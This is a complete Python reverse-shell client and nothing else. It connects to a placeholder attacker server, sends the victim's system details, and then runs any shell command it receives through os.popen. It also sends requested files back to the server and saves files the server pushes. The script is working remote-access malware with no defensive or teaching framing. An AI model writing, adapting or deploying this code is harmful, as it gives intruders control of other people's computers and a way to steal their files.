import socket
import os
import platform

# Server configuration
SERVER_HOST = 'your_server_ip'  # Replace 'your_server_ip' with the actual IP address of your server
SERVER_PORT = 9999

def get_system_info():
    """Collect basic system information."""
    info = {
        'OS': platform.system(),
        'OS Version': platform.version(),
        'Architecture': platform.architecture()[0],
        'Processor': platform.processor(),
    }
    return info

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_HOST, SERVER_PORT))

    # Send system information to the server
    system_info = get_system_info()
    system_info_str = '\n'.join([f"{key}: {value}" for key, value in system_info.items()])
    client.sendall(system_info_str.encode() + b'\n')

    while True:
        try:
            command = client.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                print("[*] Exiting...")
                break

            if command.startswith('upload'):
                _, filename = command.split(' ', 1)
                with open(filename, 'wb') as f:
                    data = client.recv(4096)
                    while data:
                        f.write(data)
                        data = client.recv(4096)
                print(f"[*] Received and saved {filename}")

            elif command.startswith('download'):
                filename = command.split(' ', 1)[1]
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        data = f.read()
                        client.sendall(data)
                else:
                    client.sendall(f"File {filename} not found.".encode())

            else:
                # Execute the command and get the output
                output = os.popen(command).read()
                if not output:
                    output = "Command executed but no output returned."
                client.sendall(output.encode())
                
        except Exception as e:
            print(f"[!] Error: {e}")
            break

if __name__ == "__main__":
    connect_to_server()
